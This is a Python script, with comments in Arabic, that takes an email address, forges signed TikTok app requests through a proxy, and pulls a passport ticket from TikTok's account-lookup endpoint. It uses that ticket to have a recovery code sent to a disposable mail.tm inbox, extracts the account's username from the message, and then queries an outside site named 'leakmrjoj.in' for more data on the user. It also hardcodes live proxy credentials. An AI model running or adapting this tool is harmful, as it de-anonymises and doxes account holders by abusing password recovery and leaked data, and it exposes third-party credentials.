#!/usr/bin/env python3
"""
سريع: يبحث عن passport_ticket عبر عدة hosts بشكل متوازي، يرسل كود بإيميل مؤقت من mail.tm،
ينتظر الاستلام ويحاول استخراج username، ثم يستعلم عن info خارجية إن كانت مطلوبة.

متطلبات:
pip install requests SignerPy

تشغيل:
export MY_PROXY="http://infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
python3 tik_fast.py
"""

import os
import re
import time
import json
import random
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import SignerPy
except Exception:
    os.system("pip install --upgrade pip")
    os.system("pip install SignerPy")
    import SignerPy

# ---------------- Config ----------------
PROXY = os.environ.get("MY_PROXY") or "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
# form proxies dict for requests
PROXIES = {"http": f"http://{PROXY}", "https": f"http://{PROXY}"} if PROXY else None

HEADERS_BASE = {
    "User-Agent": f"com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{random.randint(1, 10**19)})",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
}

NET_HOSTS = [
    "api31-normal-useast2a.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api2.musical.ly",
    "api16-normal-useast5.tiktokv.us",
    "api16-normal-no1a.tiktokv.eu",
    "rc-verification-sg.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api22-normal-c-useast1a.tiktokv.com",
    "api16-normal-c-useast1a.musical.ly",
    "api19-normal-c-useast1a.musical.ly",
    "api.tiktokv.com",
]

SEND_HOSTS = [
    "api22-normal-c-alisg.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api22-normal-probe-useast2a.tiktokv.com",
    "api16-normal-probe-useast2a.tiktokv.com",
    "rc-verification-sg.tiktokv.com"
]

BASE_PARAMS_TEMPLATE = {
    'device_platform': 'android',
    'ssmix': 'a',
    'channel': 'googleplay',
    'aid': '1233',
    'app_name': 'musical_ly',
    'version_code': '360505',
    'version_name': '36.5.5',
    'manifest_version_code': '2023605050',
    'update_version_code': '2023605050',
    'ab_version': '36.5.5',
    'os_version': '10',
    'device_id': 0,
    'app_version': '30.1.2',
    'request_from': 'profile_card_v2',
    'request_from_scene': '1',
    'scene': '1',
    'mix_mode': '1',
    'os_api': '34',
    'ac': 'wifi',
    'request_tag_from': 'h5'
}

MAX_WORKERS = 8
REQUEST_TIMEOUT = 6  # seconds per request (short for speed)
MAILBOX_POLL_INTERVAL = 2  # seconds
MAILBOX_TIMEOUT = 60  # seconds to wait for mail

# --------- Utilities ----------
def safe_sign_params(params):
    try:
        return SignerPy.sign(params=params)
    except Exception as e:
        # fallback: try SignerPy.get then sign again or return empty dict
        try:
            SignerPy.get(params=params)
            return SignerPy.sign(params=params)
        except Exception:
            return {}

def build_headers_with_sign(base_headers, signature):
    h = base_headers.copy()
    h.update({
        'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
        'x-ss-stub': signature.get('x-ss-stub', ''),
        'x-argus': signature.get('x-argus', ''),
        'x-gorgon': signature.get('x-gorgon', ''),
        'x-khronos': signature.get('x-khronos', ''),
        'x-ladon': signature.get('x-ladon', ''),
    })
    # add a passport csrf token for lookup
    h['x-tt-passport-csrf-token'] = uuid.uuid4().hex
    return h

# --------- MailTM (synchronous) ----------
class MailTMClient:
    def __init__(self):
        self.base = "https://api.mail.tm"
        self.headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    def gen(self):
        try:
            r = requests.get(f"{self.base}/domains", headers=self.headers, timeout=10)
            r.raise_for_status()
            domain = r.json()["hydra:member"][0]["domain"]
            local = ''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(12))
            mail = f"{local}@{domain}"
            payload = {"address": mail, "password": local}
            requests.post(f"{self.base}/accounts", json=payload, headers=self.headers, timeout=10)
            token = requests.post(f"{self.base}/token", json=payload, headers=self.headers, timeout=10).json().get("token")
            return mail, token
        except Exception as e:
            print("[MailTM] error:", e)
            return None, None

    def mailbox(self, token, timeout=MAILBOX_TIMEOUT):
        headers = {**self.headers, "Authorization": f"Bearer {token}"}
        total = 0
        while total < timeout:
            time.sleep(MAILBOX_POLL_INTERVAL)
            total += MAILBOX_POLL_INTERVAL
            try:
                inbox = requests.get(f"{self.base}/messages", headers=headers, timeout=10).json()
                messages = inbox.get("hydra:member", [])
                if messages:
                    msg_id = messages[0]["id"]
                    msg = requests.get(f"{self.base}/messages/{msg_id}", headers=headers, timeout=10).json()
                    return msg.get("text", "")
            except Exception:
                continue
        return None

# --------- Core: find passport ticket in parallel ----------
def find_passport_ticket(account_param, session: requests.Session, base_params):
    """
    Returns (ticket_or_None, used_variant, raw_response_json_or_none)
    Runs parallel requests across hosts to be fast.
    """
    variants = [account_param.strip(), account_param.strip().lower()]
    variants = list(dict.fromkeys(variants))  # unique order-preserving

    tasks = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = []
        for acct in variants:
            for host in NET_HOSTS:
                params = base_params.copy()
                ts = int(time.time())
                params['ts'] = ts
                params['_rticket'] = int(ts * 1000)
                params['account_param'] = acct
                # Sign
                signature = safe_sign_params(params)
                headers = build_headers_with_sign(HEADERS_BASE, signature)
                url = f"https://{host}/passport/account_lookup/email/"
                # submit job
                futures.append(ex.submit(do_post_json, session, url, params, headers, REQUEST_TIMEOUT))
        # wait for first successful result that contains ticket/accounts
        for fut in as_completed(futures, timeout=REQUEST_TIMEOUT + 2):
            try:
                resp, url_called = fut.result()
            except Exception:
                continue
            if not resp:
                continue
            # parse JSON
            try:
                j = resp.json()
            except Exception:
                continue
            accounts = j.get('data', {}).get('accounts', [])
            if not accounts:
                continue
            first = accounts[0]
            ticket = first.get('passport_ticket') or first.get('not_login_ticket') or None
            username = first.get('user_name') or first.get('username') or None
            used_variant = params.get('account_param')
            return ticket, used_variant, j
    return None, None, None

def do_post_json(session, url, params, headers, timeout):
    """
    Helper to POST with requests.Session and return response object and url.
    """
    try:
        r = session.post(url, params=params, headers=headers, timeout=timeout)
        # don't raise here; caller inspects
        return r, url
    except Exception as e:
        return None, url

# --------- send code using ticket (parallel over send hosts) ----------
def send_code_using_ticket(passport_ticket, session: requests.Session, base_params):
    mail_client = MailTMClient()
    mail, token = mail_client.gen()
    if not mail or not token:
        print("[send_code] Failed to create disposable mail")
        return None, None

    print("[send_code] created disposable mail:", mail)
    params = base_params.copy()
    ts = int(time.time())
    params['ts'] = ts
    params['_rticket'] = int(ts * 1000)
    params['not_login_ticket'] = passport_ticket
    params['email'] = mail
    params['type'] = "3737"
    params.pop('fixed_mix_mode', None)
    params.pop('account_param', None)

    signature = safe_sign_params(params)
    headers = build_headers_with_sign(HEADERS_BASE, signature)

    # try send code across send hosts in parallel and return on first success
    with ThreadPoolExecutor(max_workers=min(len(SEND_HOSTS), MAX_WORKERS)) as ex:
        futures = {}
        for host in SEND_HOSTS:
            url = f"https://{host}/passport/email/send_code"
            futures[ex.submit(do_post_json, session, url, params, headers, REQUEST_TIMEOUT)] = host

        for fut in as_completed(futures):
            resp, url_called = fut.result()
            host = futures.get(fut)
            if not resp:
                continue
            try:
                j = resp.json()
            except Exception:
                continue
            # success detection
            if j.get("message") == "success" or j.get("status") == "success":
                print(f"[send_code] success on host {host}")
                # wait for email
                body = mail_client.mailbox(token, timeout=MAILBOX_TIMEOUT)
                if not body:
                    print("[send_code] mailbox timeout/no body")
                    return None, mail
                # try Arabic pattern first
                m = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+?)\.', body)
                if m:
                    return m.group(1).strip(), mail
                m2 = re.search(r'username[:\s]+([A-Za-z0-9_\.]+)', body, re.IGNORECASE)
                if m2:
                    return m2.group(1).strip(), mail
                # fallback: return body for manual inspection
                return None, mail
    return None, mail

# --------- main fast flow ----------
def fast_flow(account_param):
    session = requests.Session()
    if PROXIES:
        session.proxies.update(PROXIES)
    # keep headers and connection pooling
    session.headers.update(HEADERS_BASE)

    # prepare base params (SignerPy.get may mutate)
    base_params = dict(BASE_PARAMS_TEMPLATE)
    try:
        base_params = SignerPy.get(params=base_params)
    except Exception as e:
        # ignore — signing will attempt later
        pass
    base_params.update({
        'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}',
        'language': 'AR'
    })

    print("[fast_flow] searching for passport_ticket ... (parallel)")
    ticket, used_variant, resp_json = find_passport_ticket(account_param, session, base_params)
    if not ticket:
        print("[fast_flow] no passport ticket found.")
        return {
            "input": account_param,
            "status": "not_found",
            "username": None,
            "passport_ticket": None,
            "mail_used": None,
            "used_variant": used_variant,
            "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
            "tiktokinfo": None
        }

    print("[fast_flow] passport ticket found:", ticket)
    username, mail_used = send_code_using_ticket(ticket, session, base_params)

    status_final = "success" if username else "no_username"
    tiktokinfo = None
    if username:
        try:
            # optional external info fetch - adjust URL as needed
            resp = session.get(f"https://leakmrjoj.in/707/tik1.php?username={username}", timeout=5)
            tiktokinfo = resp.json() if resp and resp.status_code == 200 else {"message": "no external info"}
        except Exception:
            tiktokinfo = {"message": "User information not available."}

    return {
        "input": account_param,
        "status": status_final,
        "username": username,
        "passport_ticket": ticket,
        "mail_used": mail_used,
        "used_variant": used_variant,
        "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
        "tiktokinfo": tiktokinfo
    }

# --------- CLI ----------
if __name__ == "__main__":
    email = input("Enter email to check: ").strip()
    result = fast_flow(email)
    print(json.dumps(result, indent=2, ensure_ascii=False))
